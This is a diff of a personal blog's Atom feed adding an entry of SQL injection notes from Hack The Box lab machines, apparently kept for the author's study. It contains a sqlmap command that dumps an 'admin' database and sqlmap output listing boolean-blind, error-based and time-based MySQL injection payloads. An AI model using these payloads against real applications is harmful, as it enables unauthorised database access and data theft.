@@ -4,13 +4,67 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-04-03T22:52:27+08:00</updated>
+ <updated>2022-04-03T23:00:34+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Complicated SQL Payloads</title>
+   <link href="https://mvineza.github.io/spindel/2022/04/03/complicated-sql-payloads"/>
+   <updated>2022-04-03T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/04/03/Complicated-SQL-Payloads</id>
+   <content type="html">&lt;h2 id=&quot;htb-europa---302-redirect&quot;&gt;HTB Europa - 302 Redirect&lt;/h2&gt;
+&lt;p&gt;Successful SQL injection leads to 302 redirect.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Complicated%20SQL%20Payloads/A34CC184-43B7-4D71-A1CB-CA737FBB1CEE.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I was unable to enumerate database except by using sqlmap.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;--proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://127.0.0.1:8080 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; req.txt &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; email &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; admin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;htb-enterprise---double-query-error-based-injection&quot;&gt;HTB Enterprise - Double Query Error-based Injection&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:12:29] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing connection to the target URL
+sqlmap resumed the following injection point&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from stored session:
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+Parameter: query &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;original value&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Payload: &lt;span class=&quot;nv&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;SELECT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CASE WHEN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;7210&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7210&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; THEN 1 ELSE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT 5043 UNION SELECT 6730&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; END&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+
+    Type: error-based
+    Title: MySQL &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FLOOR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Payload: &lt;span class=&quot;nv&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 AND &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT 2881 FROM&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT COUNT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,CONCAT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x71626a6b71,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ELT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;2881&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2881,1&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;,0x716b716b71,FLOOR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RAND&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;a&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+    Type: time-based blind
+    Title: MySQL &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 5.0.12 AND time-based blind &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;query SLEEP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Payload: &lt;span class=&quot;nv&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 AND &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT 1004 FROM &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SLEEP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;OoNX&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:12:29] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] the back-end DBMS is MySQL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;[HTB: Enterprise&lt;/td&gt;
+          &lt;td&gt;0xdf hacks stuff - Double Query Error-based Injection](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#beyond-root—error-based-sqli)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=NWVJ2b0D1r8&amp;amp;t=6000s&quot;&gt;HTB Enterprise by Ippsec&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;htb-unattended-nested-sql-injection&quot;&gt;HTB Unattended nested SQL Injection&lt;/h2&gt;
+&lt;p&gt;This box is tough, I haven’t understand fully &lt;a href=&quot;https://0xdf.gitlab.io/2019/08/24/htb-unattended.html#shell-as-www-data&quot;&gt;this&lt;/a&gt; technique but I will put it here for reference.&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>DPAPI (Data Protection API)</title>
